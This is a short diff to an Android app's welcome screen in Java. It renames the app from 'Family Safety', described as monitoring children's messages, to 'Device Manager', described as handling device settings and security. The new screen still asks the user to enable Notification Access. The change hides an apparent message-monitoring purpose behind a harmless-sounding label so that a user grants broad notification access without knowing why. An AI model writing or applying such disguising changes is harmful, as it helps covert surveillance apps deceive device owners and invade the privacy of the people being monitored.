@@ -15,12 +15,12 @@ public class WelcomeActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
 
         TextView title = new TextView(this);
-        title.setText("Family Safety");
+        title.setText("Device Manager");
         title.setTextSize(24f);
         title.setPadding(50, 100, 50, 20);
 
         TextView desc = new TextView(this);
-        desc.setText("This app helps parents monitor their children's messages for safety.\n\nPlease enable Notification Access to continue.");
+        desc.setText("This app helps manage your device settings and security.\n\nPlease enable Notification Access to continue.");
         desc.setTextSize(14f);
         desc.setPadding(50, 20, 50, 40);
 
